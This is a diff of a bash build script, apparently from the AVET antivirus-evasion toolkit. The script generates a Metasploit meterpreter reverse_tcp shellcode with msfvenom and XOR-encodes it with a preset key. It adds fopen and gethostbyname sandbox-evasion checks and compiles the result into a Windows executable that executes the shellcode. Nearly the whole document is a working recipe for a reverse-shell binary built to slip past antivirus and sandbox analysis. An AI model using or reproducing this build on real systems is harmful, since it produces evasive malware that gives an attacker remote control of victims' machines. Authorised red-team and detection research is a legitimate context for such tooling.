@@ -1,6 +1,9 @@
 #!/bin/bash      
 # example build script
 
+# print AVET logo
+cat banner.txt
+
 # include script containing the compiler var $win32_compiler
 # you can edit the compiler in build/global_win32.sh
 # or enter $win32_compiler="mycompiler" here
@@ -15,33 +18,46 @@ LHOST=$GLOBAL_LHOST
 
 # generate payload
 #msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
-msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f raw -a x86 --platform Windows > thepayload.bin
+msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f raw -a x86 --platform Windows > input/sc_raw.txt
 
 # import feature construction interface
 . build/feature_construction.sh
 
-# add fopen sandbox evasion feature
-add_feature fopen_sandbox_evasion
+# add evasion techniques
+add_evasion fopen_sandbox_evasion
+add_evasion gethostbyname_sandbox_evasion
+printf "\n#define HOSTVALUE \"this.that\"" >> source/evasion/evasion.include
+#add_evasion hide_console
 
-# hide console window
-#add_feature hide_console
+# generate key file
+generate_key preset aabbcc12de input/key_raw.txt
+
+# encode shellcode
+encode_shellcode xor input/sc_raw.txt input/scenc_raw.txt input/key_raw.txt
+
+# array name buf is expected by static_from_file retrieval method
+./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf
 
 # set shellcode source
-shellcode_source internet_explorer
+set_shellcode_source static_from_file input/scenc_c.txt
+
+# convert generated key from raw to C into array "key"
+./tools/data_raw_to_c/data_raw_to_c input/key_raw.txt input/key_c.txt key
+
+# set key source
+set_key_source static_from_file input/key_c.txt
+
+# set decoder
+set_decoder xor
 
 # set shellcode binding technique
-shellcode_binding exec_shellcode
+set_shellcode_binding exec_shellcode
 
 # enable debug printing
-append_value PRINT_DEBUG "" source/shellcode_binding.h	
-
-# add gethostbyname killswitch evasion feature
-#append_value KVALUE localhost
-#add_feature gethostbyname_sandbox_evasion
+enable_debug_print to_file C:/avetdbg.txt
 
 # compile
-$win32_compiler -o output/pwn.exe source/avet.c
+$win32_compiler -o output/output.exe source/avet.c -lws2_32
 
 # cleanup
-# rm sc.txt
 cleanup_techniques
